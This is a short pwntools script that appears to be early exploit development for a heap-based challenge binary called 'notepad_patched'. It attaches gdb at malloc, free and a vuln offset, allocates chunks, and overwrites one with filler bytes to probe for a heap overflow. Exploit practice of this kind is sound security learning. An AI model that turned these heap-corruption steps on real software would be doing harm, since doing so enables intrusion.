#!/usr/bin/env python3

from pwn import *

binary = "./notepad_patched"
libc = ELF("./libc.so.6")


context.binary = binary

p = process(binary)
s = '''
b * malloc
b * free
b * vuln+104
'''


#p.sendline("0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA") # malloc 0x10
p.sendline(b"0 " + b"A" * 0x18) # malloc 0x20
p.sendline(b"0 " + b'B' * 0xf0 ) # malloc 0x20


#p.sendline("2 0") # free 0
#p.sendline("2 1") # free 1



p.sendline(b"1 0 " + b"A" * 0x18) # edit 0


#p.sendline("2 0") # free 0

gdb.attach(p, s)
p.interactive()
